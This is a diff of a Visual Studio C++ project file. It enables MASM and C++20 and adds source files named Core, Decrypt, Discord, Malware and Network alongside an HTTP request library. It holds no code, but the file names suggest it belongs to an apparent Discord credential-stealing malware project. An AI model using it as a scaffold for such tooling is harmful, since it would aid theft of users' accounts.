@@ -54,6 +54,7 @@
   </PropertyGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
   <ImportGroup Label="ExtensionSettings">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
   </ImportGroup>
   <ImportGroup Label="Shared">
   </ImportGroup>
@@ -107,6 +108,7 @@
       <SDLCheck>true</SDLCheck>
       <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
       <ConformanceMode>true</ConformanceMode>
+      <LanguageStandard>stdcpp20</LanguageStandard>
     </ClCompile>
     <Link>
       <SubSystem>Console</SubSystem>
@@ -146,10 +148,24 @@
     </Link>
   </ItemDefinitionGroup>
   <ItemGroup>
+    <ClCompile Include="src\features\Core.cpp" />
+    <ClCompile Include="src\features\Decrypt.cpp" />
+    <ClCompile Include="src\features\Discord.cpp" />
+    <ClCompile Include="src\features\Malware.cpp" />
+    <ClCompile Include="src\features\Network.cpp" />
     <ClCompile Include="src\lib\httpReq\HTTPRequest.hpp" />
     <ClCompile Include="src\Main.cpp" />
   </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="src\features\Core.hpp" />
+    <ClInclude Include="src\features\Decrypt.hpp" />
+    <ClInclude Include="src\features\Discord.hpp" />
+    <ClInclude Include="src\features\Malware.hpp" />
+    <ClInclude Include="src\features\Network.hpp" />
+    <ClInclude Include="src\Settings.hpp" />
+  </ItemGroup>
   <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
   <ImportGroup Label="ExtensionTargets">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.targets" />
   </ImportGroup>
 </Project>
